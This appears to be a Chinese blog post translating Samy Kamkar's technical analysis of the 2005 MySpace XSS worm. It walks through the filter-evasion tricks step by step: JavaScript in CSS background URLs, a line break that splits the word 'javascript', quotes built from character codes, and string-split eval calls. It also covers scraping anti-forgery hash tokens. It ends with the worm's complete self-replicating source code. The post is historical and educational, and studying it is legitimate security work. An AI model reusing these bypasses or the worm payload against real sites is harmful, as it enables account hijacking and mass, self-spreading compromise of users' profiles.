---
layout: post
title: "[译]MySpace蠕虫技术分析"
category: front-end
excerpt: '在2005年，Samy kamkar在为Myspace社交网站新注册的账户交不到好友而感到苦恼不已。他起初的想法是让自己账户...'
---

[>>更好的阅读体验](https://www.zybuluo.com/lxjwlt/note/212822)

> 在2005年，Samy kamkar在为Myspace社交网站新注册的账户交不到好友而感到苦恼不已。他起初的想法是让自己账户页面更炫，这样能吸引更多女生来关注他。在对Myspace.com页面的摸索过程中，他发现页面中能够嵌入javascript代码，于是他的想法从“让账户页面更炫”，变成了，每个浏览他账户页面的用户都会把他加为好友，而每个加他好友的用户的账户页面都嵌入同样的代码，朋友的朋友也会加他为好友...在不到一天的时间里，Samy的蠕虫感染100万名用户，这是Web安全史上第一重量级的XSS蠕虫。下面是Samy公布的该蠕虫的技术分析，文中有介绍到蠕虫代码是如何绕开Myspace.com的敏感词过滤的，还有他对其中技术难点的思考过程。这篇文章让我惊艳，其中技术难点的攻破非常有启发意义，所以粗略的译了译，希望和大家分享。

Myspace蠕虫也叫做“Samy蠕虫”或“JS.Spacehero蠕虫”。

[点击这里，查看MySpace蠕虫实现、发表以及紧接着“狂欢“的整个过程](http://samy.pl/popular)

在最下面附上MySapce蠕虫的全部源代码。

请注意，这代码以及分析是在MySpace网站解决了该蠕虫之后才公布的。

这些技术公布出来的时候，它们已经无法在MySpace上发挥作用了，所以现在这些技术都失效了。否则，这恐怕已经一团糟了。

好，让我们来更深入的探讨一下，这些问题的产生，它的背景，以及在通常情况下，它是如何生效的。

1）Myspace网站过滤了许多标签。事实上，他们貌似只保留了`<a>`标签、`<img>`标签和`<div>`标签...可能还有其他的（`<embed>`标签，也许吧）。他们禁止了`<script>`标签、`<body>`标签、onClick标签属性、on前缀的所有标签属性、包含javascript代码的href属性，等等...然而，一些浏览器（IE，某些版本的Safari，等等）允许CSS标签中带有javascript代码。例如：

```html
<div style="background:url('javascript:alert(1)')">
```

2) 因为我们已经使用了单引号和双引号，所以在该`<div>`标签里不能再使用引号了。这让JS代码编写起来非常的困难。为了解决这个问题，我们使用一个表达式来存储JS代码，然后通过name查询来执行它：

```html
<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
```

3) 非常好！现在我们可以在javascript代码中使用单引号了。然而，Myspace网站过滤了“javascript”等敏感词。为了绕开这个限制，我们了解到，一些浏览器会将“java\nscript”解析为“javascript”（即java<换行>script）：

```html
<div id="mycode" expr="alert('hah!')" style="background:url('java 
script:eval(document.all.mycode.expr)')">
```

4) OK，即使我们让单引号生效了，但有时候我们也需要双引号。我们可以对双引号进行转义，比如：“foo\"bar”。但Myspace网站猜到我会这么做...他们过滤了所有转义过的引号，无论是单引号还是双引号。但是，我们在javascript中可以将数值转换成ASCII码来生成引号：

```html
<div id="mycode" expr="alert('double quote: ' + String.fromCharCode(34))" style="background:url('java 
script:eval(document.all.mycode.expr)')">
```

5) 为了把代码提交到用户的账户页面中，我们需要得到页面的源码。啊哈，我们可以使用document.body.innerHTML来得到该页面的源码，账户页面会保留浏览过（哪怕一次）该页面的用户的ID。Myspace网站又再一次猜到我的想法，它过滤了所有的“innerHTML”。为了绕开这限制，我们使用eval()来调用两个字符串，将它们拼接到一起，组合成“innerHTML”：

```html
alert(eval('document.body.inne' + 'rHTML'));
```

6) 是时候访问其他页面了。我们可能会想到用iframe标签，但很多时候（即便是隐藏的时候），iframe都不是那么有效，而且用户也会很明显的觉察到“某些事情”正在发生。所以，我们使用AJAX（XML-HTTP）来构造GET和POST请求。然而，Myspace网站过滤了一个XML-HTTP请求必要的关键字：“onreadystatechange”。再次，我们使用eval来绕开它。选用XML-http的另一原因在于，Myspace网站上执行操作的必要cookie可以很轻松地发送给后台：

```html
eval('xmlhttp.onread' + 'ystatechange = callback');
```

7) 是时候给用户的账户页面发送GET情况了，这样我们可以获取到他们当前的关注列表。我们并不是要删除任何关注的好友，我们只是想把我们自己添加到他们关注列表中。如果我们GET请求获取到了他们的账户页面，我们可以抓取到他们的英雄并保存起来，方便后面使用。之前讲过了，这对于XML-HTTP来说是很容易办到的，但是我们必须获取到浏览该页面的用户的ID。就像我们上面说道，我们可以通过获取页面源码来实现这一点。然而，现在我们需要在这个页面上对一个特殊的单词进行搜索。于是乎我们开始了搜索，如果这么做了，搜索总会找到我们自己写的代码，因为我们代码里就包含了我们要查找的那个单词...我们告诉电脑“如果这个页面包含了‘foo’单词，那么执行以下操作”，这判断语句会永远返回true，因为它总会在执行搜索的代码里找到这个单词。我们通过eval()和字符串结合的方式来避开这个问题：

```javascript
var index = html.indexOf('frien' + 'dID');
```

8) 目前为止，我们获取到了关注列表。接下来，通过构造一个XML-http的POST请求发送到添加朋友页面，把我加为好友。噢，别这样，这竟然不起作用！为什么行不通？我们在profile.myspace.com上，然而添加朋友的POST请求只能在www.myspace.com上请求。没什么大不了的，但是XML-HTTP不予许跨域发送GET/POST请求。为了避开这一限制，我们要跳转到www.myspace.com的同个url上。在www.myspace.com上你依旧能够访问到账户页面，所以将页面重新加载到我们可以进行POST操作的域名上：

```javascript
if (location.hostname == 'profile.myspace.com') 
    document.location = 'http://www.myspace.com' + location.pathname + location.search;
```

9) 我们终于可以进行POST请求了！然而，当我们发送POST请求，它却不会成功添加朋友。为什么会这样？Myspace网站给需要进行POST操作的页面生成了一个随机的哈希值（例如，“你确定要添加这位用户为好友么”页面）。如果POST请求中没有附带这个哈希值，该请求便不会生效。为了解决这个问题，我们假装是一个浏览器，在添加好友之前，用GET方式获取到对应页面，解析其源码获取到这段哈希值，然后构造POST请求的时候附上这段哈希值。

10) 当POST请求完成后，我们还要在关注列表上添加一名关注并附上蠕虫代码。代码和新增关注放在同个地方，这样我们只需要发送一个POST请求就可以了。为了获得新的哈希值，我们需要GET请求到该页面，但在此之前，我们必须重新生成POST发送的蠕虫代码。最简单的方式就是抓取我们所在账户页面中的源码，把蠕虫代码解析出来，然后POST发送出去。这能够做到，但现在所有代码都乱码了！啊，我们需要对代码进行URL编码或转义，这样POST请求才可以正确的发送这段代码。奇怪，还是不行。显然，javascript的URL编码和转义函数并不能把所有必要的东西都进行转义，所以我们需要手动来执行一些替换，让关键的数据能够成功转义。我们加上了一小段文字“但最重要的是，samy是我的偶像”。紧随其后，我们加入所有的蠕虫代码。现在，我们有了一个可”自复制“的代码了，如果你愿意，你可以将它称之为蠕虫。

11) 还有一些限制，比如标签属性赋值的最大长度，这会造成其他的问题，而且要求压缩代码，不可以有空格，模糊的变量命名，可复用的函数，等等...

还有少部分需要解决的技术难点。无论怎么说，这都不是一个一帆风顺的过程，而且这也不是想要造成任何伤害或想要激怒任何人。这只是兴趣使然。这过程让人觉得很有趣很好玩！

最后附上源码：

```html
<div id=mycode style="BACKGROUND: url('java 
script:eval(document.all.mycode.expr)')" expr="var B=String.fromCharCode(34);var A=String.fromCharCode(39);function g(){var C;try{var D=document.body.createTextRange();C=D.htmlText}catch(e){}if(C){return C}else{return eval('document.body.inne'+'rHTML')}}function getData(AU){M=getFromURL(AU,'friendID');L=getFromURL(AU,'Mytoken')}function getQueryParams(){var E=document.location.search;var F=E.substring(1,E.length).split('&');var AS=new Array();for(var O=0;O<F.length;O++){var I=F[O].split('=');AS[I[0]]=I[1]}return AS}var J;var AS=getQueryParams();var L=AS['Mytoken'];var M=AS['friendID'];if(location.hostname=='profile.myspace.com'){document.location='http://www.myspace.com'+location.pathname+location.search}else{if(!M){getData(g())}main()}function getClientFID(){return findIn(g(),'up_launchIC( '+A,A)}function nothing(){}function paramsToString(AV){var N=new String();var O=0;for(var P in AV){if(O>0){N+='&'}var Q=escape(AV[P]);while(Q.indexOf('+')!=-1){Q=Q.replace('+','%2B')}while(Q.indexOf('&')!=-1){Q=Q.replace('&','%26')}N+=P+'='+Q;O++}return N}function httpSend(BH,BI,BJ,BK){if(!J){return false}eval('J.onr'+'eadystatechange=BI');J.open(BJ,BH,true);if(BJ=='POST'){J.setRequestHeader('Content-Type','application/x-www-form-urlencoded');J.setRequestHeader('Content-Length',BK.length)}J.send(BK);return true}function findIn(BF,BB,BC){var R=BF.indexOf(BB)+BB.length;var S=BF.substring(R,R+1024);return S.substring(0,S.indexOf(BC))}function getHiddenParameter(BF,BG){return findIn(BF,'name='+B+BG+B+' value='+B,B)}function getFromURL(BF,BG){var T;if(BG=='Mytoken'){T=B}else{T='&'}var U=BG+'=';var V=BF.indexOf(U)+U.length;var W=BF.substring(V,V+1024);var X=W.indexOf(T);var Y=W.substring(0,X);return Y}function getXMLObj(){var Z=false;if(window.XMLHttpRequest){try{Z=new XMLHttpRequest()}catch(e){Z=false}}else if(window.ActiveXObject){try{Z=new ActiveXObject('Msxml2.XMLHTTP')}catch(e){try{Z=new ActiveXObject('Microsoft.XMLHTTP')}catch(e){Z=false}}}return Z}var AA=g();var AB=AA.indexOf('m'+'ycode');var AC=AA.substring(AB,AB+4096);var AD=AC.indexOf('D'+'IV');var AE=AC.substring(0,AD);var AF;if(AE){AE=AE.replace('jav'+'a',A+'jav'+'a');AE=AE.replace('exp'+'r)','exp'+'r)'+A);AF=' but most of all, samy is my hero. <d'+'iv id='+AE+'D'+'IV>'}var AG;function getHome(){if(J.readyState!=4){return}var AU=J.responseText;AG=findIn(AU,'P'+'rofileHeroes','</td>');AG=AG.substring(61,AG.length);if(AG.indexOf('samy')==-1){if(AF){AG+=AF;var AR=getFromURL(AU,'Mytoken');var AS=new Array();AS['interestLabel']='heroes';AS['submit']='Preview';AS['interest']=AG;J=getXMLObj();httpSend('/index.cfm?fuseaction=profile.previewInterests&Mytoken='+AR,postHero,'POST',paramsToString(AS))}}}function postHero(){if(J.readyState!=4){return}var AU=J.responseText;var AR=getFromURL(AU,'Mytoken');var AS=new Array();AS['interestLabel']='heroes';AS['submit']='Submit';AS['interest']=AG;AS['hash']=getHiddenParameter(AU,'hash');httpSend('/index.cfm?fuseaction=profile.processInterests&Mytoken='+AR,nothing,'POST',paramsToString(AS))}function main(){var AN=getClientFID();var BH='/index.cfm?fuseaction=user.viewProfile&friendID='+AN+'&Mytoken='+L;J=getXMLObj();httpSend(BH,getHome,'GET');xmlhttp2=getXMLObj();httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&friendID=11851658&Mytoken='+L,processxForm,'GET')}function processxForm(){if(xmlhttp2.readyState!=4){return}var AU=xmlhttp2.responseText;var AQ=getHiddenParameter(AU,'hashcode');var AR=getFromURL(AU,'Mytoken');var AS=new Array();AS['hashcode']=AQ;AS['friendID']='11851658';AS['submit']='Add to Friends';httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&Mytoken='+AR,nothing,'POST',paramsToString(AS))}function httpSend2(BH,BI,BJ,BK){if(!xmlhttp2){return false}eval('xmlhttp2.onr'+'eadystatechange=BI');xmlhttp2.open(BJ,BH,true);if(BJ=='POST'){xmlhttp2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xmlhttp2.setRequestHeader('Content-Length',BK.length)}xmlhttp2.send(BK);return true}"></DIV>
```

\- samy